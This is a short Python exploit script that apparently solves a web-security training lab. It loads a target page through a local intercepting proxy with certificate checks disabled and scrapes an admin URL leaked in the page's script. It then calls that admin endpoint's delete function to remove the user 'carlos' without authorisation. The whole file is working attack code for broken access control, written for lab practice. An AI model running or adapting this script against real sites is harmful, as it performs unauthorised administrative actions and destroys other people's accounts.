import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def delete_user(url):
    r = requests.get(url, verify=False, proxies=proxies)
    
    # Retrieve the cookies from the response
    session_cookie = r.cookies.get_dict().get('session')
    
    # Retrieve the admin path; Use BeatifulSoup to parse the request and extract the admin path
    soup = BeautifulSoup(r.text, 'lxml')
    admin_instances = soup.find(text=re.compile('/admin'))
    admin_path = re.search("href', '(.*)'", admin_instances).group(1)
    
    # Delete Carlos user
    cookies = {'session': session_cookie}
    delete_carlos_url = url + admin_path + '/delete?username=carlos'
    
    r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
    
    if r.status_code == 200:
        print('(+) Carlos user deleted!')
    else:
        print('(-) Deletion failed')
        print('(-) Program exiting...')
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print(f'(+) Usage <url> {sys.argv[0]}')
        print(f'(+) Example: www.example.com {sys.argv[0]}')
        sys.exit(-1)
        
    url = sys.argv[1]
    print('(+) Deleting Carlos user...')
    delete_user(url)


if __name__ == '__main__':
    main()
    